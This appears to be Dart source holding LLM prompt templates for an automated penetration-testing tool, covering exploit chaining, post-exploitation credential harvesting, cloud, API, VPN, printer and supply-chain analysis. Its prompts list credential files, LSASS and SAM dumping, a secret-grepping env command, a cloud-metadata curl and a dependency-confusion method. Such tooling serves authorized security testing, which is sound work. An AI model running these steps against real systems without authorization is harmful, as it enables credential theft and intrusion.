Evidence: target domain name identifiable from recon data (any FQDN, CNAME, or certificate CN field). Severity: INFORMATIONAL for CT log data itself — but each live subdomain discovered becomes a separate attack target whose vulnerability is assessed by other prompts.

### Subdomain Takeover via Dangling DNS Records
A dangling DNS record is a CNAME, A, or AAAA record that points to an infrastructure resource that no longer exists — a decommissioned cloud service endpoint, a deleted hosting account, or an expired third-party integration. An attacker who registers or claims the referenced resource gains control of the subdomain.
Evidence of dangling records: CNAME records pointing to third-party platform hostnames (cloud hosting, PaaS providers, SaaS platforms, CDN endpoints) where the referenced resource returns an unclaimed/available error response rather than the expected application content. Common patterns: CNAME to a cloud platform hostname where the corresponding account or service has been deleted; CNAME chain that terminates in an unresolvable hostname.
Testing approach: for each CNAME record, resolve the full chain and check whether the final destination is an active, owned resource. An error page indicating the resource is available for registration confirms the dangling condition.
Severity: CRITICAL when the dangling endpoint is a cloud provider resource that can be registered by an attacker — allows the attacker to serve content on the organisation's subdomain, capture cookies, and intercept OAuth callbacks.

## RULES
- Generate findings only for external targets where domain names are identifiable in recon data
- Zone transfer: generate a HIGH severity finding for each nameserver that responds to AXFR/IXFR — each is a separate finding with the nameserver address as evidence
- CT log: generate one INFORMATIONAL finding describing what was found; generate SEPARATE findings for each live subdomain discovered that represents a meaningful attack surface
- Subdomain takeover: generate CRITICAL finding for each confirmed dangling CNAME where the target resource is claimable
- CONFIDENCE: HIGH for confirmed zone transfer response; MEDIUM for confirmed dangling CNAME; LOW for CT log subdomains that require further validation

''';

  /// Phase 36.3: Generic exploit chain reasoning prompt.
  /// Fires after all vulnerability testing loops complete when ≥2 findings are confirmed.
  /// Target-agnostic — works for web, network, and AD confirmed findings.
  static String exploitChainReasoningPrompt(List<Vulnerability> confirmedFindings) {
    final findingsBlock = confirmedFindings.map((f) {
      final chainHint = f.statusReason.contains('Chain opportunity:')
          ? '\n    Chain hint: ${f.statusReason.split('Chain opportunity:').last.trim()}'
          : '';
      return '  - [${f.severity}/${f.vulnerabilityType}] ${f.problem} @ ${f.targetAddress}: ${f.statusReason.split('\n\nChain').first.trim()}$chainHint';
    }).join('\n');
    return '''
You are an expert penetration tester reasoning about multi-step attack chains from confirmed findings. Using only the confirmed findings below, identify how they can be combined into a higher-impact attack path.

## CONFIRMED FINDINGS:
$findingsBlock

## YOUR TASK — construct exploit chains:

### Step 1 — Map access surfaces:
For each confirmed finding, identify what access it grants:
- RCE / Command Injection → OS shell on target
- SQLi → Database access
- Auth Bypass / Default Credentials → Authenticated session
- LFI / Path Traversal → File read access
- SSRF → Internal network probe access
- Privilege Escalation → Elevated OS privileges

### Step 2 — Build chains:
Identify combinations where one confirmed finding enables or amplifies another. Write each chain as a numbered sequence. Each step MUST reference a confirmed finding from the list above.

Example: (1) LFI on port 80 reads /etc/shadow → (2) Offline crack yields user credentials → (3) SSH login with cracked credentials → (4) sudo misconfiguration grants root

### Step 3 — Assess combined impact:
What can an attacker achieve by combining these findings that they could not achieve with any single finding alone?

## OUTPUT RULES:
- vulnerabilityType: "AttackChain"
- severity: CRITICAL if chain reaches domain/system compromise; HIGH otherwise
- description: full numbered chain referencing the component findings
- evidence_quote: an exact substring from one of the component findings' statusReason or evidence
- Generate one entry per distinct chain; if no viable chain exists, return []

''';
  }

  // ---------------------------------------------------------------------------
  // Post-exploitation / pillaging prompts (Phase 3.2)
  // ---------------------------------------------------------------------------

  /// Fires after shell access is confirmed on a Linux/macOS target.
  /// Generates structured pillaging objectives as Vulnerability findings.
  static String postExploitLinuxPillagingPrompt(String deviceJson, String shellEvidence) => '''
You are an expert penetration tester. You have confirmed shell access to a Linux/Unix target. Your task is to identify ALL high-value pillaging objectives that should be pursued from this foothold.

## CONFIRMED ACCESS EVIDENCE:
$shellEvidence

## TARGET DEVICE DATA:
$deviceJson

## PILLAGING OBJECTIVES TO ASSESS:
Generate findings for each of the following categories where the access level makes them feasible:

### Credential Harvest targets:
- /etc/passwd and /etc/shadow — user enumeration and password hashes
- Bash/shell history for all users (~/.bash_history, /root/.bash_history, ~/.zsh_history)
- SSH private keys in all home directories (~/.ssh/id_*, /root/.ssh/)
- SSH known_hosts files (reveals internal network topology)
- Credential files: ~/.netrc, ~/.pgpass, ~/.my.cnf, ~/.boto, ~/.s3cfg, ~/.git-credentials
- Cloud credentials: ~/.aws/credentials, ~/.config/gcloud/credentials.db, ~/.azure/
- Container service account tokens: /var/run/secrets/kubernetes.io/, /run/secrets/
- Application config files containing password=, secret=, api_key=, token=, DATABASE_URL

### Sensitive Data targets:
- Web application config files (/etc/app/, /var/www/, /srv/, /opt/, /app/)
- Database credential files (config.php, database.yml, .env, settings.py, appsettings.json)
- Private keys and certificates (/etc/ssl/private/, /etc/nginx/ssl/)
- Backup files containing sensitive data (*.bak, *.sql, *.dump)

### Privilege Escalation Paths:
- Current user privileges: sudo -l
- SUID/SGID binaries: find / -perm /4000 -o -perm /2000
- Writable cron jobs and systemd units
- Kernel version for known privilege escalation vulnerabilities
- Docker socket access: /var/run/docker.sock
- Writable /etc/passwd or /etc/sudoers

### Lateral Movement:
- Running processes and listening services (internal services not exposed externally)
- Network connections and routing table (other reachable hosts)
- /etc/hosts and /etc/resolv.conf (internal DNS/domain)
- SSH authorized_keys in all home dirs (access to other hosts)
- Active user sessions (who, w, last)

For each finding, set:
- vulnerabilityType: one of "Post-Exploitation:Credential Harvest", "Post-Exploitation:Sensitive Data", "Post-Exploitation:Privilege Escalation Path", "Post-Exploitation:Lateral Movement Path", "Post-Exploitation:Persistence"
- severity: CRITICAL for credential/hash access, HIGH for config/key access, MEDIUM for recon data
- evidence: describe specifically what should be found and why it is accessible at the current privilege level

''';

  /// Fires after shell access is confirmed on a Windows target.
  static String postExploitWindowsPillagingPrompt(String deviceJson, String shellEvidence) => '''
You are an expert penetration tester. You have confirmed command execution on a Windows target. Your task is to identify ALL high-value pillaging objectives feasible from this foothold.

## CONFIRMED ACCESS EVIDENCE:
$shellEvidence

## TARGET DEVICE DATA:
$deviceJson

## PILLAGING OBJECTIVES TO ASSESS:

### Credential Harvest targets:
- Windows Credential Manager and DPAPI blobs (stored passwords for network shares, RDP, browsers)
- PowerShell history: %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
- Browser saved passwords (Chrome, Edge, Firefox profile directories)
- RDP connection history and .rdp files with saved credentials
- IIS web.config files for database connection strings and API keys
- Registry credential storage: autologon keys (HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon)
- SAM database dump approach (requires SYSTEM) for local account hashes
- LSASS memory for domain credential extraction (requires SYSTEM)
- Group Policy Preferences files in SYSVOL (legacy cpassword attribute)
- Unattended install files (unattend.xml, sysprep.inf, autounattend.xml)

### Sensitive Data:
- Service account credentials (services running as domain users — SC qc or Get-Service)
- Application config files in Program Files and ProgramData
- Network shares accessible from this host (net view, net use)
- Scheduled tasks with credentials or interesting scripts

### Privilege Escalation Paths:
- AlwaysInstallElevated registry policy (MSI escalation)
- Unquoted service paths and writable service binaries
- SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege (token impersonation)
- Writable directories in system PATH
- Current token privileges: whoami /priv

### Lateral Movement:
- Domain users and groups (if domain joined: net user /domain, net group /domain)
- Internal network connectivity and ARP cache
- WinRM, SMB, RDP access to other hosts using found credentials
- Active sessions: qwinsta, net sessions

For each finding, set vulnerabilityType to one of the Post-Exploitation sub-types and appropriate severity.

''';

  /// Fires when cloud credentials/metadata access is confirmed.
  static String postExploitCloudPillagingPrompt(String deviceJson, String accessEvidence) => '''
You are an expert cloud penetration tester. Cloud credentials or metadata endpoint access has been confirmed. Identify all high-value pillaging objectives from this cloud identity.

## CONFIRMED ACCESS EVIDENCE:
$accessEvidence

## TARGET DEVICE DATA:
$deviceJson

## PILLAGING OBJECTIVES TO ASSESS:

### Identity & Permissions:
- Enumerate current cloud identity (sts:GetCallerIdentity / gcloud config list / az account show)
- List all IAM policies and roles attached to this identity
- Check for admin/owner-level permissions that allow privilege escalation
- Test for dangerous IAM permissions: iam:CreatePolicyVersion, iam:PassRole, iam:PutRolePolicy, sts:AssumeRole (AWS); Microsoft.Authorization/roleAssignments/write (Azure); roles/iam.securityAdmin (GCP)

### Credential Harvest:
- Environment variables containing secrets (env | grep -iE "key|secret|token|password|api")
- EC2 user data with embedded credentials (IMDSv1: curl http://169.254.169.254/latest/user-data)
- Secrets Manager / Parameter Store / Key Vault enumeration
- Service account key files in the application filesystem
- Kubernetes service account tokens in /var/run/secrets/

### Data Access:
- S3 bucket enumeration (list buckets accessible to this identity, check for public access)
- Azure Storage Account enumeration
- GCS bucket enumeration
- RDS/CloudSQL/Cosmos DB instances accessible from this identity
- Lambda/Function environment variables (often contain API keys)

### Lateral Movement:
- Other EC2/VM instances in the same VPC/subnet/resource group
- Assume-role paths to higher-privilege identities
- Cross-account trust relationships
- Container registries (ECR/ACR/GCR) — can pull images with embedded secrets

For each finding, set vulnerabilityType to one of the Post-Exploitation sub-types and appropriate severity.

''';

  /// Fires when database access is confirmed (any DB type).
  static String postExploitDatabasePillagingPrompt(String deviceJson, String dbType, String accessEvidence) => '''
You are an expert penetration tester. Authenticated database access has been confirmed on a $dbType instance. Identify all high-value pillaging objectives.

## CONFIRMED ACCESS EVIDENCE:
$accessEvidence

## TARGET DEVICE DATA:
$deviceJson

## PILLAGING OBJECTIVES TO ASSESS:

### Credential Harvest:
- Enumerate all databases and tables — look for: users, accounts, admin, credentials, auth_tokens, api_keys, sessions, secrets, passwords
- Extract password hashes from user tables for offline cracking
- Look for plaintext passwords in config tables, settings, or audit logs
- Extract connection strings from stored procedures or application tables
- Check for linked servers / dblinks (MSSQL: sp_linkedservers; PostgreSQL: postgres_fdw; Oracle: dblinks)

### Sensitive Data:
- PII tables: customers, patients, employees, members, orders, transactions
- Payment data: credit_card, payment, billing tables
- API keys and tokens stored in database
- Configuration values with secrets

### Privilege Escalation:
- MSSQL: test xp_cmdshell for OS command execution; check IS_SRVROLEMEMBER('sysadmin')
- MySQL: test for FILE privilege (LOAD DATA INFILE, INTO OUTFILE) and UDF execution
- PostgreSQL: test COPY TO/FROM for file read/write; check for superuser role
- MongoDB: check for admin database access and user enumeration
- Redis: check for CONFIG SET dir/dbfilename for file write to cron or authorized_keys

### Lateral Movement:
- Database users and their privilege levels
- Audit logs revealing application credentials used to connect
- Internal IP addresses in stored data or config

For each finding, set vulnerabilityType to one of the Post-Exploitation sub-types and appropriate severity.

''';

  /// Generates a short, reproducible numbered list of steps to reproduce a confirmed finding.
  static String reproductionStepsPrompt(String vulnProblem, String vulnDescription, String confirmingCommand, String commandOutput) => '''
You are writing a penetration test report. A vulnerability has been confirmed. Write concise, numbered reproduction steps that another security professional could follow to reproduce this finding from scratch.

## VULNERABILITY:
- Problem: $vulnProblem
- Description: $vulnDescription

## CONFIRMING COMMAND:
$confirmingCommand

## COMMAND OUTPUT (proof):
${commandOutput.length > 800 ? commandOutput.substring(0, 800) : commandOutput}

Write 3–7 numbered steps. Each step should be a single clear action. Include the exact confirming command as one of the steps. Do not explain why — just describe what to do.

Respond ONLY with a JSON object:
{
  "steps": [
    "Step 1 description",
    "Step 2 description",
    ...
  ]
}''';

  // ---------------------------------------------------------------------------
  // Lockout safety context block — injected into exploit loop for credential attacks
  // ---------------------------------------------------------------------------

  /// Returns a prompt block warning the LLM about AD/service account lockout risk.
  /// Inject this into the iteration prompt whenever the vulnerability involves
  /// credential attacks (brute force, spraying, Kerberos, LDAP, SMB auth).
  static String lockoutSafetyContext() => '''
## LOCKOUT SAFETY — CRITICAL: READ BEFORE ANY CREDENTIAL ATTACK

Before performing ANY credential spraying, brute-force, or repeated authentication attempt:

1. **Enumerate lockout policy FIRST** — before sending any credentials, determine:
   - Domain lockout threshold: `net accounts /domain`, `ldapsearch -x -b "" -s base lockoutThreshold`, or `Get-ADDefaultDomainPasswordPolicy`
   - Lockout observation window and duration
   - For web apps: test with one known-bad credential to check lockout behavior

2. **Spray limits based on policy:**
   - If lockout threshold ≤ 3: DO NOT spray at all — risk is too high
   - If lockout threshold ≤ 5: Maximum 1 attempt per account per observation window
   - If threshold > 5: Spray at most threshold-2 attempts, spread across accounts (not per-account)

3. **Prefer horizontal spraying over vertical brute-force:**
   - Try one password across many accounts — do NOT try many passwords on one account
   - Wait between rounds if any lockout indicators appear (401, "Account locked", "Too many attempts")

4. **Exclude high-risk accounts from spraying:**
   - Do not spray administrator/root accounts that could lock out critical systems
   - Avoid accounts with names suggesting they are service accounts with locked-out impact

5. **If any account locks out during testing — STOP ALL CREDENTIAL ATTACKS immediately** and document the lockout as a finding (Excessive Authentication Attempts / Missing Lockout Delay).

Record the lockout policy in your "thought" field before sending any credential-based command.''';

  // ---------------------------------------------------------------------------
  // Cloud security analysis prompts (Phase 4.2–4.4)
  // ---------------------------------------------------------------------------

  /// Cloud IAM / credential enumeration prompt.
  static String cloudIamEnumerationPrompt(String deviceJson, String providerName) => '''
You are an expert cloud penetration tester. Analyze the device data and identify exploitable cloud IAM and identity misconfigurations.

## DEVICE DATA:
$deviceJson

## CLOUD PROVIDER: $providerName

## WHAT TO IDENTIFY:

### 1. INSTANCE METADATA SERVICE (IMDS) EXPOSURE
- IMDS endpoint accessible without IMDSv2 enforcement (AWS: 169.254.169.254, GCP: metadata.google.internal)
- SSRF vulnerabilities that could reach the metadata endpoint and retrieve instance credentials
- Instance role/managed identity credentials obtainable via metadata

### 2. OVERPRIVILEGED IAM ROLES / SERVICE ACCOUNTS
- Instance profile with AdministratorAccess, Owner, Editor, or broad wildcard permissions
- Permissions allowing iam:PassRole, iam:CreatePolicyVersion, iam:AttachRolePolicy (privilege escalation paths)
- Compute roles with full storage access (unnecessary data access)
- Ability to create new IAM users, keys, or roles (persistence)

### 3. EXPOSED CREDENTIALS IN APPLICATION LAYER
- Long-lived IAM access keys hardcoded in application configs, environment variables, or source code
- Cloud SDK credential files (.aws/credentials, application_default_credentials.json) world-readable
- Secrets Manager / Key Vault secrets with overly broad read access

### 4. CROSS-ACCOUNT / FEDERATION WEAKNESSES
- Misconfigured trust relationships allowing role assumption from external accounts
- Overly permissive STS assume-role policies
- Federated identity providers accepting untrusted issuers

### 5. LOGGING AND DETECTION GAPS
- CloudTrail / Cloud Audit Logs disabled or not covering management events
- GuardDuty / Security Command Center / Defender for Cloud not enabled

Return a JSON array of findings. Each element:
{
  "problem": "Short title",
  "description": "What is misconfigured, what an attacker can do",
  "severity": "CRITICAL|HIGH|MEDIUM|LOW",
  "confidence": "HIGH|MEDIUM|LOW",
  "evidence": "What in the device data suggests this",
  "recommendation": "Remediation steps",
  "vulnerabilityType": "Cloud:IAM Misconfiguration",
  "businessRisk": "Brief business impact"
}

Return [] if none apply. Respond ONLY with valid JSON.''';

  /// Cloud object storage (S3/GCS/Blob) misconfiguration prompt.
  static String cloudStoragePrompt(String deviceJson, String providerName) => '''
You are an expert cloud penetration tester. Analyze the device data and identify cloud object storage misconfigurations.

## DEVICE DATA:
$deviceJson

## CLOUD PROVIDER: $providerName

## WHAT TO IDENTIFY:

### 1. PUBLIC BUCKET / CONTAINER ACCESS
- S3 buckets, GCS buckets, or Azure Blob containers publicly readable or listable
- Bucket names predictable from domain/application name
- Public write access enabling data injection or website defacement

### 2. SENSITIVE DATA IN ACCESSIBLE STORAGE
- Backup archives, database dumps, or log files in publicly accessible buckets
- Source code or config files (.env, credentials.json, web.config) in storage
- PII or regulated data (PCI, HIPAA) without access controls

### 3. BUCKET POLICY AND ACL WEAKNESSES
- Block Public Access settings disabled
- Legacy ACL grants (AllUsers, AuthenticatedUsers) that bypass bucket policies
- Cross-account access policies granting excessive permissions

### 4. STORAGE SECURITY FEATURES DISABLED
- Server-side encryption not enforced
- Versioning disabled on buckets with sensitive data
- Access logging disabled

Return a JSON array. Each element:
{
  "problem": "Short title",
  "description": "What is misconfigured and impact",
  "severity": "CRITICAL|HIGH|MEDIUM|LOW",
  "confidence": "HIGH|MEDIUM|LOW",
  "evidence": "Supporting evidence from device data",
  "recommendation": "Remediation",
  "vulnerabilityType": "Cloud:Storage Misconfiguration",
  "businessRisk": "Business impact"
}

Return [] if none apply. Respond ONLY with valid JSON.''';

  /// Serverless / container registry security prompt.
  static String cloudServerlessContainerPrompt(String deviceJson, String providerName) => '''
You are an expert cloud penetration tester. Analyze the device data and identify serverless function and container registry security issues.

## DEVICE DATA:
$deviceJson

## CLOUD PROVIDER: $providerName

## WHAT TO IDENTIFY:

### 1. SERVERLESS FUNCTION SECURITY (Lambda / Cloud Functions / Azure Functions)
- Environment variables containing secrets, API keys, or database credentials
- Overprivileged execution role (AdministratorAccess on a Lambda)
- Publicly exposed function URLs or API Gateway endpoints without authentication
- Injection via event payload parameters

### 2. CONTAINER REGISTRY MISCONFIGURATIONS (ECR / GCR / ACR)
- Public container registry with sensitive images accessible without authentication
- Images containing hardcoded secrets or credentials in layers
- No image scanning enabled (known vulnerable base images deployed)

### 3. CONTAINER ORCHESTRATION (EKS / GKE / AKS)
- Kubernetes API server publicly accessible without network restrictions
- Nodes using overprivileged IAM roles / service accounts
- Privileged pods or containers with hostPID / hostNetwork
- Secrets without encryption at rest

### 4. CI/CD PIPELINE EXPOSURE
- Pipeline secrets accessible via misconfigured CI/CD jobs
- Artifact repositories with public read
- Build logs leaking secrets

Return a JSON array. Each element:
{
  "problem": "Short title",
  "description": "What is misconfigured and impact",
  "severity": "CRITICAL|HIGH|MEDIUM|LOW",
  "confidence": "HIGH|MEDIUM|LOW",
  "evidence": "Supporting evidence from device data",
  "recommendation": "Remediation",
  "vulnerabilityType": "Cloud:Serverless/Container Security",
  "businessRisk": "Business impact"
}

Return [] if none apply. Respond ONLY with valid JSON.''';

  // ---------------------------------------------------------------------------
  // Extended API security prompts (Phase 5.1)
  // ---------------------------------------------------------------------------

  /// BOLA/IDOR and mass assignment prompt for REST/GraphQL APIs.
  static String apiBolaPrompt(String deviceJson) => '''
You are an expert API penetration tester. Analyze the device data and identify Broken Object Level Authorization (BOLA/IDOR), mass assignment, and excessive data exposure vulnerabilities.

## DEVICE DATA:
$deviceJson

## WHAT TO IDENTIFY:

### 1. BROKEN OBJECT LEVEL AUTHORIZATION (BOLA / IDOR)
- API endpoints accepting object IDs in path or query: /api/users/{id}, /orders/{orderId}
- Resources returned without verifying the requesting user owns that object
- Predictable or enumerable IDs enabling horizontal privilege escalation

### 2. MASS ASSIGNMENT
- POST/PUT/PATCH endpoints binding additional fields not intended for user modification
- User registration where "role", "isAdmin", "verified", or "permissions" may be writable
- Profile update endpoints where account tier or credits could be elevated

### 3. EXCESSIVE DATA EXPOSURE
- API responses returning full internal objects with sensitive fields (hashes, financial data)
- GraphQL queries without field-level authorization allowing extraction of sensitive properties
- Verbose errors leaking internal field names, stack traces, or schema

### 4. BROKEN FUNCTION LEVEL AUTHORIZATION
- Admin-only API endpoints (/api/admin/*, /internal/*) accessible to regular users
- HTTP method abuse: DELETE or PUT accessible when only GET is documented
- Version confusion: /v1/ has authz checks but /v2/ does not

Return a JSON array. Each element:
{
  "problem": "Short title",
  "description": "What is missing and what an attacker can access",
  "severity": "CRITICAL|HIGH|MEDIUM|LOW",
  "confidence": "HIGH|MEDIUM|LOW",
  "evidence": "Supporting evidence",
  "recommendation": "Remediation",
  "vulnerabilityType": "API:Authorization Flaw",
  "businessRisk": "Business impact"
}

Return [] if none apply. Respond ONLY with valid JSON.''';

  /// Webhook and async API security prompt.
  static String apiWebhookPrompt(String deviceJson) => '''
You are an expert API penetration tester. Analyze the device data and identify webhook and async API security issues.

## DEVICE DATA:
$deviceJson

## WHAT TO IDENTIFY:

### 1. WEBHOOK SECURITY
- Webhook registration endpoints accepting arbitrary callback URLs (SSRF via webhook delivery)
- Missing HMAC signature validation allowing forged event delivery
- Webhook payloads with sensitive data delivered to untrusted URLs
- Targets reaching internal services (169.254.x.x, 10.x.x.x)

### 2. ASYNC JOB / QUEUE POISONING
- Job submission endpoints without authorization on parameters
- Queue consumers processing untrusted data without sanitization
- Status polling endpoints with IDOR on job results (GET /jobs/{id})

### 3. WEBSOCKET SECURITY
- WebSocket upgrade without CSRF or Origin validation
- Broadcast channels delivering messages to all clients (data leakage)
- Missing authorization on WebSocket subscriptions

### 4. API KEY AND OAUTH WEAKNESSES
- API keys in URL query parameters (logged in access logs)
- OAuth implicit flow still in use (token in URL)
- OAuth state parameter missing or static (CSRF)
- Refresh tokens with excessive lifetime or no rotation

Return a JSON array. Each element:
{
  "problem": "Short title",
  "description": "What is vulnerable and the attack scenario",
  "severity": "CRITICAL|HIGH|MEDIUM|LOW",
  "confidence": "HIGH|MEDIUM|LOW",
  "evidence": "Supporting evidence",
  "recommendation": "Remediation",
  "vulnerabilityType": "API:Webhook/Async Security",
  "businessRisk": "Business impact"
}

Return [] if none apply. Respond ONLY with valid JSON.''';

  // ---------------------------------------------------------------------------
  // Additional specialized prompts (Phase 6.1–6.5)
  // ---------------------------------------------------------------------------

  /// Database security analysis prompt.
  /// Fire when database ports (1433, 1521, 3306, 5432, 27017, 6379, etc.) are open.
  static String databaseSecurityPrompt(String deviceJson) => '''
You are an expert penetration tester specializing in database security. Analyze the device data and identify database attack surface.

## DEVICE DATA:
$deviceJson

## WHAT TO IDENTIFY:

### 1. UNAUTHENTICATED OR WEAKLY AUTHENTICATED ACCESS
- Database port exposed without authentication (Redis, MongoDB, Elasticsearch defaults)
- Default credentials (root/root, sa/, admin/admin, postgres/postgres)
- Authentication bypass via empty or blank password

### 2. DATABASE PRIVILEGE ESCALATION
- Application account with DBA/superuser privileges
- MySQL FILE privilege enabling OS file read/write
- MSSQL xp_cmdshell enabled or enableable
- PostgreSQL COPY TO/FROM PROGRAM or untrusted language extensions
- User-defined functions (UDFs) loaded from filesystem

### 3. SENSITIVE DATA EXPOSURE
- PII tables accessible (users, customers, employees, patients)
- Payment card data stored in plaintext
- Password hashes retrievable for offline cracking
- API keys, tokens, or credentials stored in application tables

### 4. NETWORK AND CONFIGURATION WEAKNESSES
- Database listening on 0.0.0.0 instead of localhost
- SSL/TLS not enforced for connections
- Audit logging disabled
- Backup files accessible from web root

Return a JSON array. Each element:
{
  "problem": "Short title",
  "description": "What is exposed and the attack scenario",
  "severity": "CRITICAL|HIGH|MEDIUM|LOW",
  "confidence": "HIGH|MEDIUM|LOW",
  "evidence": "Supporting evidence from device data",
  "recommendation": "Remediation",
  "vulnerabilityType": "Database:Security Misconfiguration",
  "businessRisk": "Business impact"
}

Return [] if none apply. Respond ONLY with valid JSON.''';

  /// VPN and remote access security prompt.
  /// Fire when VPN ports (1194, 1723, 4500, 500) or remote access ports are open.
  static String vpnRemoteAccessPrompt(String deviceJson, {TargetScope scope = TargetScope.internal}) {
    final isExternal = scope == TargetScope.external;
    final scopeContext = isExternal ? '''

## EXTERNAL TARGET — VPN GATEWAY ATTACK FOCUS:
This VPN/remote access service is internet-facing. Focus on attacking the gateway itself:
- Credential stuffing against the VPN portal (username enumeration, password spraying)
- Known CVEs in the identified VPN software version (pre-authentication RCE, auth bypass)
- MFA bypass on the VPN portal (push fatigue, OTP brute force, recovery code abuse)
- Authentication bypass via parameter manipulation or legacy protocol fallback''' : '''

## INTERNAL TARGET — VPN MISCONFIGURATION FOCUS:
This VPN/remote access service is internally scoped. Focus on misconfiguration:
- Split tunneling exposing internal routes to connected clients
- Overly permissive ACLs granting VPN clients access to all internal segments
- Client certificate theft from accessible certificate stores
- RADIUS credential capture from VPN authentication traffic''';
    return '''
You are an expert penetration tester. Analyze the device data and identify VPN and remote access vulnerabilities.

## DEVICE DATA:
$deviceJson$scopeContext

## WHAT TO IDENTIFY:

### 1. VPN SERVICE VULNERABILITIES
- Known vulnerable VPN appliance versions (pre-authentication RCE or auth bypass)
- Default or weak credentials on VPN management interfaces
- IKE aggressive mode enabled (PSK hash exposed for offline cracking)

### 2. REMOTE DESKTOP (RDP) SECURITY
- RDP exposed to internet without NLA
- Unpatched Windows versions with known RDP vulnerabilities
- Weak or reused credentials on RDP-accessible accounts
- RDP gateway without MFA

### 3. VNC / REMOTE MANAGEMENT
- VNC without authentication or with default password
- IPMI/BMC exposed (default credentials, cipher 0 bypass, RAKP hash disclosure)
- iDRAC/iLO with default credentials or known vulnerabilities

### 4. SSH WEAKNESSES
- SSH accepting password authentication for root
- Known-weak key algorithms (DSA, RSA < 2048 bits)
- Authorized keys from unexpected sources

Return a JSON array. Each element:
{
  "problem": "Short title",
  "description": "What is vulnerable and the attack scenario",
  "severity": "CRITICAL|HIGH|MEDIUM|LOW",
  "confidence": "HIGH|MEDIUM|LOW",
  "evidence": "Supporting evidence from device data",
  "recommendation": "Remediation",
  "vulnerabilityType": "Remote Access:Security Weakness",
  "businessRisk": "Business impact"
}

Return [] if none apply. Respond ONLY with valid JSON.''';
  }

  /// Printer and MFP attack surface prompt.
  /// Fire when ports 9100, 515, 631 are open or device type suggests printer/MFP.
  static String printerMfpPrompt(String deviceJson) => '''
You are an expert penetration tester. Analyze the device data and identify printer and MFP vulnerabilities.

## DEVICE DATA:
$deviceJson

SCOPE RESTRICTION: Only generate findings for vulnerabilities that are SPECIFIC to printer/MFP devices and not already covered by the general network service analysis (FTP, Telnet, SSL/TLS). Do NOT re-generate findings for anonymous FTP, cleartext Telnet, or weak TLS certificates — those are handled by other analysis passes. Focus on printer-specific attack surfaces: web admin interface default credentials, print job interception, SNMP community strings, PJL/PostScript command injection, firmware update mechanisms, and scan-to-email credential exposure.

## WHAT TO IDENTIFY:

### 1. UNAUTHENTICATED ACCESS AND DEFAULT CREDENTIALS
- Web admin interface without authentication
- Default credentials (admin/admin, admin/1234, blank password)
- SNMP community string "public" or "private"

### 2. SENSITIVE DATA EXPOSURE
- Stored print jobs readable via raw port (9100) or web interface
- Address book / phonebook readable (internal contacts, fax numbers)
- Network credentials readable from config (LDAP bind, SMB auth, scan-to-email)

### 3. NETWORK PIVOTING
- PJL/PostScript command execution extracting network config
- Stored network credentials usable for lateral movement
- NTLM relay via scan-to-folder

### 4. FIRMWARE AND SERVICE VULNERABILITIES
- Known vulnerable firmware version
- FTP with anonymous access or default credentials
- Telnet enabled (cleartext management)
- Web interface with known CVEs

Return a JSON array. Each element:
{
  "problem": "Short title",
  "description": "What is vulnerable and the attack scenario",
  "severity": "CRITICAL|HIGH|MEDIUM|LOW",
  "confidence": "HIGH|MEDIUM|LOW",
  "evidence": "Supporting evidence from device data",
  "recommendation": "Remediation",
  "vulnerabilityType": "IoT/Printer:Security Weakness",
  "businessRisk": "Business impact"
}

Return [] if none apply. Respond ONLY with valid JSON.''';

  /// Password spray and account lockout analysis prompt.
  /// Fire when credential-based attack surface is identified (AD, web login, OWA, API).
  static String passwordSprayAnalysisPrompt(String deviceJson) => '''
You are an expert penetration tester. Analyze the device data and identify missing account lockout protections and password spray attack surface.

## DEVICE DATA:
$deviceJson

## WHAT TO IDENTIFY:

### 1. MISSING OR WEAK ACCOUNT LOCKOUT
- No lockout policy (unlimited login attempts)
- Lockout threshold too high (> 10 attempts) for internet-facing services
- Lockout duration too short (< 5 minutes)
- AD lockout exists but web/API endpoints have no rate limiting

### 2. PASSWORD SPRAY ATTACK SURFACE
- Active Directory Kerberos pre-authentication (AS-REQ enumeration)
- OWA / Exchange / Office 365 login pages for password spraying
- Web login forms without CAPTCHA or rate limiting
- API authentication endpoints without rate limiting
- VPN or remote access portals without MFA

### 3. USERNAME ENUMERATION
- Login forms revealing whether username or password was wrong separately
- API returning 404 for invalid users vs. 403 for wrong password
- LDAP null base bind enabling user enumeration

### 4. MFA GAPS
- MFA not enforced for administrative accounts
- MFA bypassable via legacy protocols (NTLM, basic auth, IMAP, POP3)
- Conditional access policies missing for internet-facing applications

Return a JSON array. Each element:
{
  "problem": "Short title",
  "description": "What is missing and the attack scenario",
  "severity": "CRITICAL|HIGH|MEDIUM|LOW",
  "confidence": "HIGH|MEDIUM|LOW",
  "evidence": "Supporting evidence from device data",
  "recommendation": "Remediation",
  "vulnerabilityType": "Authentication:Missing Lockout/Rate Limiting",
  "businessRisk": "Business impact",
  "lockoutThreshold": "Estimated lockout threshold (integer) based on target type: 3 for OWA/Exchange, 5 for AD default, 10 for most web apps, 0 if unknown"
}

Return [] if none apply. Respond ONLY with valid JSON.''';

  // ---------------------------------------------------------------------------
  // Phase 10 — Supply Chain Analysis Prompt
  // ---------------------------------------------------------------------------

  static String supplyChainAnalysisPrompt(String deviceJson) => '''
You are an expert penetration tester specializing in software supply chain security. Analyze the device data below and identify supply chain attack surfaces including dependency confusion, package registry exposure, and CI/CD artifact poisoning.

## DEVICE DATA:
$deviceJson

## SCOPE — supply chain attack classes:

### Dependency Confusion
Attacker objective: cause package managers to install an attacker-controlled public package instead of an internal private package by registering the same name on the public registry with a higher version number.
Mechanism: if internal package names are discoverable (from package manifests in public repos, job postings, error messages, or exposed manifest files), register the same name on npm/PyPI/RubyGems with version 9999.0.0 — package managers prefer the higher version from the public registry.
Evidence: internal package registry accessible; package manifest files (package.json, requirements.txt, pom.xml) visible in web responses; source code references to internal package names
Severity: CRITICAL — arbitrary code execution on every developer machine and CI/CD pipeline that installs the package

### Exposed Package Registry Without Authentication
Attacker objective: read all packages from an internal Nexus/Artifactory instance, potentially including packages containing secrets, internal libraries with embedded credentials, or binary artifacts.
Evidence: Nexus (port 8081/8082), Artifactory (port 8081/8082), Verdaccio (port 4873), or package manager paths (/repository/, /artifactory/, /packages/) accessible without authentication
Severity: HIGH — internal package contents may contain credentials and proprietary code

### CI/CD Pipeline Artifact Poisoning
Attacker objective: inject malicious artifacts into the build pipeline by pushing to an accessible internal registry.
Mechanism: if the build pipeline pulls packages from both public and internal registries, an attacker who can push to the internal registry can inject malicious artifacts that get incorporated into production builds.
